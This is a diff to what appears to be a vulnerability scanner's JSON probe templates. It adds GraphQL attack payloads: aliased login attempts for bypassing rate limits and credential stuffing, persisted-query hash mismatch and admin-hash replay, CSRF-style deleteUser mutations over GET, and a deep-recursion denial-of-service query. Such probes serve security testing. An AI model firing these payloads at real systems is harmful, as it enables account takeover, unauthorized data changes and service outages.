@@ -150,7 +150,7 @@
       ]
     },
     "alias_amplification": {
-      "description": "Query complexity attack via aliases — one request, many operations",
+      "description": "Query complexity attack via aliases — one request, many operations. Critical use case: bypass rate-limit on auth/login.",
       "tech_match": ["GraphQL", "Apollo", "Express"],
       "param_match": ["query", "graphql"],
       "probes": [
@@ -160,6 +160,64 @@
           "matchers": [{"type": "word", "words": ["__typename"]}],
           "severity": "medium",
           "confidence_boost": 25
+        },
+        {
+          "payload": "{\"query\":\"{a:login(user:\\\"x\\\",pass:\\\"1\\\") b:login(user:\\\"x\\\",pass:\\\"2\\\") c:login(user:\\\"x\\\",pass:\\\"3\\\") d:login(user:\\\"x\\\",pass:\\\"4\\\") e:login(user:\\\"x\\\",pass:\\\"5\\\")}\"}",
+          "description": "Aliased login — 5 password attempts in one HTTP request bypasses rate-limit (1 HTTP request = 1 attempt). Scale to 100+ for credential stuffing.",
+          "matchers": [{"type": "word", "any": ["token", "session", "user"]}, {"type": "not_word", "words": ["rate limit"]}],
+          "severity": "critical",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "persisted_query_hash_attacks": {
+      "description": "Persisted query / APQ attacks — hash-query mismatch, anonymous replay, hash collision.",
+      "tech_match": ["GraphQL", "Apollo", "Relay"],
+      "param_match": ["query", "operationName", "extensions", "persistedQuery"],
+      "probes": [
+        {
+          "payload": "{\"query\":\"mutation{login(user:\\\"victim\\\",pass:\\\"x\\\")}\",\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"0000000000000000000000000000000000000000000000000000000000000000\"}}}",
+          "description": "Hash-query mismatch — server SHOULD reject if sha256(query) != hash. Some libs trust the query when hash is wrong, allowing arbitrary mutation under whitelisted hash.",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "word", "any": ["data", "errors"]}, {"type": "not_word", "words": ["MismatchedQueryHash", "PersistedQueryNotSupported"]}],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "{\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"<known_admin_query_hash>\"}}}",
+          "description": "Replay known admin-query hash without auth headers. Some APQ caches don't tie hashes to user/role — admin queries become anonymous-callable.",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "word", "any": ["admin", "users", "roles"]}],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "csrf_via_get": {
+      "description": "GraphQL over GET — server accepts queries via GET parameters, opening CSRF surface for state-changing mutations.",
+      "tech_match": ["GraphQL"],
+      "param_match": ["query"],
+      "probes": [
+        {
+          "payload": "?query=mutation{deleteUser(id:1)}",
+          "description": "Issue mutation via GET. If server processes, CSRF is trivial via <img src=...>",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["GET method not allowed", "method_not_allowed"]}],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"method": "GET"}
+        }
+      ]
+    },
+    "deep_recursion": {
+      "description": "Schema cycle exploitation — recursively self-referential types lead to exponential expansion.",
+      "tech_match": ["GraphQL"],
+      "param_match": ["query"],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{user(id:1){posts{author{posts{author{posts{author{posts{author{posts{id}}}}}}}}}}}\"}",
+          "description": "10-level deep recursion. If accepted (no max-depth limit) and timing >2x baseline, DoS confirmed.",
+          "matchers": [{"type": "timing", "min_ms": 5000}, {"type": "status", "status": [200, 502, 504]}],
+          "severity": "high",
+          "confidence_boost": 45
         }
       ]
     }
